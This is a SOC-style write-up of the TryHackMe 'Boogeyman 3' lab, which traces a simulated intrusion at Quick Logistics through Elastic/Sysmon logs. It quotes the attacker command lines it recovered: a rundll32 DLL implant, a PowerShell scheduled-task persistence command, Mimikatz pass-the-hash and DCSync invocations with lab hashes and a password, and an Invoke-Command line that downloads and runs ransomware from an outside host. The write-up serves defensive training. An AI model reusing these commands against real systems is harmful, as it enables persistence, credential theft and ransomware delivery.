# Boogeyman 3 — The Chaos Inside

## Overview

This write-up documents my investigation of the **Boogeyman 3 — The Chaos Inside** challenge from TryHackMe.

The scenario simulates a post-compromise intrusion against **Quick Logistics LLC**, where the threat actors had already obtained initial access and remained undetected before attempting to expand their access.

The attacker subsequently targeted **Evan Hutchinson**, the CEO of Quick Logistics LLC, through a suspicious email containing an ISO attachment disguised as a financial report:

    ProjectFinancialSummary_Q3.pdf

Although the attachment appeared suspicious, Evan opened it. The attachment contained an **HTML Application (HTA)** file that acted as the initial malicious payload. After opening the document and observing no obvious activity, Evan reported the email to the security team.

The security team determined that the incident occurred between **August 29 and August 30, 2023**.

For this investigation, I used the **Elastic Stack (ELK)** to search and correlate endpoint telemetry, primarily using Sysmon and Windows event data.

The investigation reconstructed the attack from initial payload execution through persistence, command and control, UAC bypass, credential dumping, Pass-the-Hash, lateral movement, DCSync, and attempted ransomware deployment.

---

## Investigation Objectives

The investigation focused on answering the following questions:

- Identify the process that executed the initial Stage 1 payload.
- Determine how the attacker implanted the payload into another location.
- Identify how the implanted file was executed.
- Identify the persistence mechanism established by the attacker.
- Identify the C2 IP address and port.
- Identify the process used for UAC bypass.
- Identify the GitHub resource used to download the credential dumping tool.
- Identify credentials obtained through credential dumping.
- Identify the remote file accessed by the attacker.
- Identify the credentials used for lateral movement.
- Identify the hostname targeted during lateral movement.
- Identify the process responsible for executing the remotely issued command.
- Identify credentials dumped from the second compromised workstation.
- Identify the account targeted through DCSync.
- Identify the ransomware binary download URL.
- Reconstruct the complete attack chain.
- Map the observed behaviors to MITRE ATT&CK techniques.

---

## Environment

| Category | Details |
|---|---|
| Platform | TryHackMe |
| Room | Boogeyman |
| Part | 3 |
| Task | The Chaos Inside |
| Analysis Platform | Elastic Stack (ELK) |
| Target Organization | Quick Logistics LLC |
| Target User | Evan Hutchinson |
| Initial Attachment | `ProjectFinancialSummary_Q3.pdf` |
| Attachment Type | ISO containing HTML Application |
| Incident Period | August 29–30, 2023 |
| Primary Telemetry | Sysmon / Windows Event Logs |

# Investigation

## 1. Initial Stage 1 Payload Analysis

### Objective

The first step was to identify the process responsible for executing the initial malicious payload.

Because the attachment was named:

    ProjectFinancialSummary_Q3.pdf

I searched Elastic for:

    ProjectFinancialSummary_Q3*

The search returned an event associated with the initial payload execution.

The process identifier was:

    PID: 6392

The process also had three child processes, which became useful for correlating the subsequent stages of execution.

### Finding

The initial Stage 1 payload was executed by the process with:

    PID 6392

The presence of multiple child processes indicated that the initial payload spawned additional processes responsible for subsequent malicious activity.

## 2. Payload Implantation

The next objective was to determine how the Stage 1 payload attempted to copy or implant a file to another location.

I continued investigating the events associated with the initial payload and examined the process message and command-line information.

The following command was identified:

    C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat

The command used `xcopy.exe` to copy:

    D:\review.dat

to:

    C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat

The `xcopy.exe` process was a child process of the initial payload and had:

    PID: 3832

### Analysis

The use of `xcopy.exe` allowed the malicious script to move `review.dat` from the mounted attachment environment to a writable temporary directory on the victim machine.

This provided the attacker with a copy of the malicious file outside the original attachment location.

### Finding

The full command line used to implant the file was:

    C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat

## 3. Execution of the Implanted File

After identifying the file implantation process, I investigated the events associated with PID `3832` and its subsequent activity.

The implanted DLL was executed using:

    "C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer

The command uses `rundll32.exe` to invoke the exported:

    DllRegisterServer

function from `review.dat`.

### Analysis

Although the file was named `review.dat`, its execution through `rundll32.exe` and the `DllRegisterServer` export indicates that the file behaved as a DLL rather than a conventional data file.

This is an example of **System Binary Proxy Execution**, where a legitimate Windows binary is abused to execute malicious code.

### Finding

The implanted file was executed using:

    "C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer

# 4. Persistence Analysis

## Scheduled Task

The next stage of the investigation focused on persistence.

I searched the events associated with the malicious activity and found a PowerShell command that created a scheduled task:

    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force

The scheduled task was configured with:

- Task Name: `Review`
- Trigger: `Daily`
- Execution Time: `06:00`

The task executes:

    rundll32.exe

against:

    C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer

### Analysis

The scheduled task ensured that the malicious DLL could be executed again automatically.

The persistence chain was:

    Scheduled Task: Review
            ↓
        rundll32.exe
            ↓
        review.dat
            ↓
      DllRegisterServer

### Finding

The persistence mechanism used by the attacker was a scheduled task named:

    Review

# 5. Command and Control Analysis

## C2 Connection

After establishing persistence, the malicious payload initiated network communication.

To investigate network activity, I used Elastic to search for Sysmon network connection events generated by PowerShell:

    process.name: "powershell.exe"
    and event.provider: "Microsoft-Windows-Sysmon"
    and event.code: "3"

Sysmon Event ID `3` represents network connection activity.

The investigation identified the following remote endpoint:

    165.232.170.151:80

### Finding

The potential C2 endpoint was:

    165.232.170.151:80

### C2 IOC

    165.232.170.151:80

# 6. UAC Bypass

## Identifying the UAC Bypass Process

The attacker subsequently discovered that the compromised account had local administrator privileges.

The next objective was to determine how the attacker attempted to bypass User Account Control (UAC).

I searched Elastic for Sysmon events related to the implanted payload:

    event.provider: "Microsoft-Windows-Sysmon"
    and "*review.dat*"

Among the resulting events was:

    fodhelper.exe

### Analysis

`fodhelper.exe` is a legitimate Windows executable that has historically been abused as part of UAC bypass techniques.

The appearance of `fodhelper.exe` in the execution chain associated with the malicious payload provided evidence of a potential UAC bypass attempt.

### Finding

The process used by the attacker for the UAC bypass was:

    fodhelper.exe

# 7. Credential Dumping

## Downloading Mimikatz

After obtaining elevated privileges, the attacker attempted to obtain credentials from the compromised machine.

I searched Elastic for references to:

    github.com

I then added `process.args` as a displayed field to make the complete command line easier to inspect.

The following URL was identified:

    https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

The URL points to a Mimikatz release archive.

### Finding

The attacker downloaded Mimikatz from:

    https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

# 8. Pass-the-Hash

After downloading Mimikatz, the attacker used it to obtain and reuse authentication material.

I searched Elastic for:

    mimikatz.exe

and examined the `process.args` field.

The following command was identified:

    C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe

The command uses:

    sekurlsa::pth

to perform a Pass-the-Hash operation using the NTLM hash associated with the `itadmin` account.

### Finding

The credential pair identified was:

    itadmin:F84769D250EB95EB2D7D8B4A1C5613F2

# 9. Remote Share Enumeration

After obtaining access using the compromised credentials, the attacker investigated accessible resources on another workstation.

The relevant PowerShell command was:

    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1

### Analysis

Several elements of this command are important.

The following path indicates access to a remote Windows file share:

    \\WKSTN-1327.quicklogistics.org\ITFiles\

The PowerShell `cat` alias was used to read the contents of the remote file.

The complete remote file path was:

    \\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1

Therefore, the file accessed by the attacker was:

    IT_Automation.ps1

### Finding

The remote file accessed by the attacker was:

    IT_Automation.ps1

# 10. Lateral Movement

## New Credentials

The contents of the remote PowerShell script provided the attacker with another set of credentials.

I searched Elastic for PowerShell and command execution events using:

    winlog.event_id: "1"
    and process.name: (cmd.exe or powershell.exe)
    and credential

The investigation identified the following command:

    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$credential = (New-Object PSCredential -ArgumentList (" "QUICKLOGISTICS\allan.smith, (ConvertTo-SecureString Tr!ckyP@ssw0rd987 -AsPlainText -Force))) ; Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}"

The credentials were:

    QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987

The command then used `Invoke-Command` to execute a command on:

    WKSTN-1327

### Finding

The new credential pair was:

    QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987

The target hostname was:

    WKSTN-1327

# 11. Remote PowerShell Execution

After obtaining the `allan.smith` credentials, the attacker performed lateral movement to:

    WKSTN-1327

I searched for Sysmon process creation events on the target workstation:

    host.hostname: "WKSTN-1327"
    and event.provider: "Microsoft-Windows-Sysmon"
    and event.code: "1"

The process:

    wsmprovhost.exe

was identified.

### Analysis

`wsmprovhost.exe` is associated with Windows Remote Management (WinRM) and PowerShell Remoting sessions.

Its presence on the second workstation, combined with the earlier use of:

    Invoke-Command

supports the conclusion that the attacker used PowerShell Remoting for lateral movement.

### Finding

The parent process associated with the remotely executed malicious command was:

    wsmprovhost.exe

# 12. Credential Dumping on the Second Workstation

After gaining access to `WKSTN-1327`, the attacker again used Mimikatz to obtain credentials.

I searched for:

    host.hostname: "WKSTN-1327"
    and "*mimikatz*"

The following command was identified:

    sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe

    exit

### Finding

The newly obtained credential pair was:

    administrator:00f80f2538dcb54e7adc715c0e7091ec

# 13. Domain Controller Access and DCSync

The attacker subsequently targeted the domain controller.

I searched for Mimikatz execution on:

    DC01

using:

    host.hostname: "DC01"
    and process.name: "mimikatz.exe"

The following command was identified:

    C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe "lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit

The command uses:

    lsadump::dcsync

to request credential material through the domain replication mechanism.

The account specifically targeted by the attacker was:

    backupda

### Finding

The account targeted during the DCSync attack was:

    backupda

This demonstrates that the attacker had progressed from a compromised endpoint toward domain-level credential access.

# 14. Ransomware Delivery

The final stage identified during the investigation involved an attempt to download and execute ransomware.

I searched Elastic for:

    process.name: "powershell.exe"
    and "*ransomboogey.exe*"

The following command was identified:

    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock {iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe; .\ransomboogey.exe}"

The command performs two actions on the remote workstation:

    iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe

followed by:

    .\ransomboogey.exe

This indicates an attempt to download and execute the ransomware binary.

### Finding

The ransomware download URL was:

    http://ff.sillytechninja.io/ransomboogey.exe

# Attack Chain

The complete attack chain reconstructed from the available Elastic evidence is:

    Suspicious Email
            │
            ▼
    ProjectFinancialSummary_Q3.pdf
            │
            ▼
    ISO Attachment
            │
            ▼
    HTML Application
            │
            ▼
    Initial Stage 1 Payload
    PID 6392
            │
            ▼
    xcopy.exe
            │
            ▼
    review.dat
            │
            ▼
    C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
            │
            ▼
    rundll32.exe
            │
            ▼
    DllRegisterServer
            │
            ├──────────────────┐
            ▼                  ▼
    Scheduled Task          C2 Connection
    Review                  165.232.170.151:80
            │
            ▼
    fodhelper.exe
            │
            ▼
    UAC Bypass
            │
            ▼
    Mimikatz
            │
            ▼
    itadmin NTLM Hash
            │
            ▼
    Pass-the-Hash
            │
            ▼
    Remote Share
            │
            ▼
    IT_Automation.ps1
            │
            ▼
    allan.smith Credentials
            │
            ▼
    PowerShell Remoting
            │
            ▼
    WKSTN-1327
            │
            ▼
    wsmprovhost.exe
            │
            ▼
    Mimikatz
            │
            ▼
    Administrator NTLM Hash
            │
            ▼
    Domain Controller
    DC01
            │
            ▼
    DCSync
            │
            ▼
    backupda
            │
            ▼
    Ransomware Download
            │
            ▼
    ransomboogey.exe

# Attack Timeline

| Stage | Event | Evidence | Analysis |
|---:|---|---|---|
| 1 | Suspicious email delivered | `ProjectFinancialSummary_Q3.pdf` | Malicious ISO attachment disguised as PDF |
| 2 | Initial payload executed | PID `6392` | Stage 1 payload execution |
| 3 | Payload implanted | `xcopy.exe` | `review.dat` copied to Temp |
| 4 | Implanted file executed | `rundll32.exe` | `review.dat,DllRegisterServer` |
| 5 | Persistence established | Task `Review` | Daily execution at 06:00 |
| 6 | C2 initiated | `165.232.170.151:80` | Potential attacker infrastructure |
| 7 | UAC bypass attempted | `fodhelper.exe` | Privilege escalation attempt |
| 8 | Credential dumping | Mimikatz | Credential access |
| 9 | Pass-the-Hash | `itadmin` NTLM hash | Reuse of stolen authentication material |
| 10 | Remote share accessed | `IT_Automation.ps1` | Remote file discovery/access |
| 11 | New credentials discovered | `allan.smith` | Credentials used for lateral movement |
| 12 | Lateral movement | `WKSTN-1327` | PowerShell Remoting |
| 13 | Remote execution | `wsmprovhost.exe` | WinRM/PowerShell Remoting |
| 14 | Credential dumping | Administrator hash | Second workstation compromised |
| 15 | Domain credential access | `lsadump::dcsync` | DCSync against `backupda` |
| 16 | Ransomware delivery | `ransomboogey.exe` | Download and execution attempt |

# Indicators of Compromise

> The following indicators were observed within the simulated TryHackMe environment.

| Type | Value | Description |
|---|---|---|
| Target User | `Evan Hutchinson` | CEO targeted by phishing email |
| Attachment | `ProjectFinancialSummary_Q3.pdf` | Malicious attachment |
| Initial PID | `6392` | Stage 1 payload process |
| File | `review.dat` | Malicious implanted payload |
| File Path | `C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat` | Implanted payload location |
| Process | `xcopy.exe` | Used to implant the payload |
| Process | `rundll32.exe` | Used to execute `review.dat` |
| Scheduled Task | `Review` | Persistence mechanism |
| C2 | `165.232.170.151:80` | Potential C2 endpoint |
| Process | `fodhelper.exe` | UAC bypass mechanism |
| Tool | `mimikatz.exe` | Credential dumping / authentication abuse |
| Credential | `itadmin:F84769D250EB95EB2D7D8B4A1C5613F2` | First stolen credential |
| Remote Host | `WKSTN-1327.quicklogistics.org` | Lateral movement target |
| Remote File | `IT_Automation.ps1` | File accessed from remote share |
| Credential | `QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987` | Credential used for lateral movement |
| Process | `wsmprovhost.exe` | PowerShell Remoting process |
| Credential | `administrator:00f80f2538dcb54e7adc715c0e7091ec` | Credential obtained on second host |
| Domain Controller | `DC01` | Domain-level target |
| DCSync Target | `backupda` | Account targeted by DCSync |
| Ransomware | `ransomboogey.exe` | Ransomware binary |
| Domain | `ff.sillytechninja.io` | Ransomware delivery infrastructure |
| URL | `http://ff.sillytechninja.io/ransomboogey.exe` | Ransomware download URL |

# MITRE ATT&CK Mapping

> The following mappings are based on behaviors directly observed in the Elastic telemetry during the investigation.

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Malicious ISO attachment delivered to Evan |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Multiple malicious PowerShell commands |
| Execution | System Binary Proxy Execution: Rundll32 | T1218.011 | `rundll32.exe review.dat,DllRegisterServer` |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | Scheduled task `Review` |
| Privilege Escalation | Bypass User Account Control | T1548.002 | `fodhelper.exe` |
| Credential Access | OS Credential Dumping | T1003 | Mimikatz credential dumping |
| Credential Access | DCSync | T1003.006 | `lsadump::dcsync` |
| Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 | `sekurlsa::pth` |
| Lateral Movement | Windows Remote Management | T1021.006 | `Invoke-Command`, `wsmprovhost.exe` |
| Discovery | Network Share Discovery | T1135 | Investigation of remote file shares |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Network connection to port 80 |
| Command and Control | Ingress Tool Transfer | T1105 | Download of Mimikatz and ransomware |
| Impact | Data Encrypted for Impact | T1486 | Ransomware execution attempt |

# Investigation Conclusion

The investigation revealed a multi-stage intrusion in which the Boogeyman threat actors progressed from a malicious attachment to domain-level credential access and an attempted ransomware deployment.

The attack began when **Evan Hutchinson** opened an ISO attachment disguised as:

    ProjectFinancialSummary_Q3.pdf

The ISO contained an HTML Application that executed the initial Stage 1 payload.

The payload then used `xcopy.exe` to implant:

    review.dat

into the user's temporary directory.

The implanted file was subsequently executed using:

    rundll32.exe

with:

    DllRegisterServer

The attacker established persistence through a scheduled task named:

    Review

and initiated a potential C2 connection to:

    165.232.170.151:80

The attacker then attempted to bypass UAC using:

    fodhelper.exe

After obtaining elevated privileges, the attacker downloaded Mimikatz and used it to obtain authentication material.

The stolen `itadmin` NTLM hash was subsequently used in a Pass-the-Hash operation.

The attacker then accessed a remote file share and read:

    IT_Automation.ps1

The script exposed another credential pair:

    QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987

These credentials were used with PowerShell Remoting to move laterally to:

    WKSTN-1327

On the second workstation, the presence of `wsmprovhost.exe` provided evidence of remote PowerShell execution.

The attacker again used Mimikatz and obtained the NTLM hash associated with the administrator account.

The intrusion then escalated toward the domain controller, where the attacker performed a DCSync operation targeting:

    backupda

Finally, the attacker attempted to download and execute:

    ransomboogey.exe

from attacker-controlled infrastructure.

Overall, the evidence demonstrates a progression from:

    Initial Execution
            ↓
        Persistence
            ↓
    Command and Control
            ↓
    Privilege Escalation
            ↓
    Credential Access
            ↓
    Lateral Movement
            ↓
    Domain Credential Access
            ↓
    Ransomware Deployment

The investigation demonstrates the importance of correlating process creation, command-line arguments, network connections, parent-child relationships, and host information across multiple Windows endpoints.

# Skills Demonstrated

- Incident Investigation
- SOC Investigation
- Elastic Stack / ELK
- Kibana Querying
- Windows Event Log Analysis
- Sysmon Analysis
- Process Analysis
- Parent-Child Process Correlation
- Command-Line Analysis
- Malware Execution Analysis
- UAC Bypass Investigation
- Credential Dumping Analysis
- Mimikatz Analysis
- Pass-the-Hash Investigation
- Windows Remote Management Analysis
- PowerShell Remoting Investigation
- Lateral Movement Analysis
- Remote Share Investigation
- DCSync Investigation
- Command and Control Analysis
- Persistence Analysis
- Ransomware Investigation
- IOC Identification
- Attack Timeline Reconstruction
- MITRE ATT&CK Mapping

---

# Lessons Learned

- File extensions should not be trusted when investigating suspicious attachments. A file presented as a PDF may actually contain a different file format or executable content.
- Process IDs and parent-child relationships are valuable for reconstructing multi-stage execution chains.
- Windows LOLBins such as `xcopy.exe`, `rundll32.exe`, and `fodhelper.exe` can be abused to execute or facilitate malicious activity.
- Scheduled tasks should be investigated when persistence is suspected.
- Sysmon Event ID 3 can provide valuable evidence of network connections associated with suspicious processes.
- Command-line arguments can reveal attacker intent that may not be visible from process names alone.
- Mimikatz activity can expose credential dumping and Pass-the-Hash operations.
- PowerShell Remoting can be abused for lateral movement and can leave useful evidence through `wsmprovhost.exe`.
- Remote file shares can contain sensitive scripts, credentials, or operational information that attackers may leverage for further compromise.
- DCSync represents a significant escalation because it can provide access to domain credential material through the domain replication mechanism.
- Correlating multiple hosts is essential when investigating lateral movement.
- Elastic provides an effective platform for correlating process, network, and Windows event telemetry during incident response.
- A successful investigation should focus on connecting individual events into a coherent attack narrative rather than analyzing each event in isolation.

# Final Attack Summary

    Initial Access
          ↓
    Malicious ISO / HTML Application
          ↓
    Stage 1 Payload (PID 6392)
          ↓
    review.dat Implantation
          ↓
    rundll32.exe Execution
          ↓
    Scheduled Task: Review
          ↓
    C2: 165.232.170.151:80
          ↓
    UAC Bypass: fodhelper.exe
          ↓
    Mimikatz
          ↓
    itadmin NTLM Hash
          ↓
    Pass-the-Hash
          ↓
    Remote Share
          ↓
    IT_Automation.ps1
          ↓
    allan.smith Credentials
          ↓
    PowerShell Remoting
          ↓
    WKSTN-1327
          ↓
    wsmprovhost.exe
          ↓
    Administrator NTLM Hash
          ↓
    DC01
          ↓
    DCSync → backupda
          ↓
    Ransomware Download
          ↓
    ransomboogey.exe

---

**Investigation Status: Complete**

**Primary Investigation Platform: Elastic Stack**

**Incident Window: August 29–30, 2023**

**Environment: TryHackMe — Boogeyman 3**
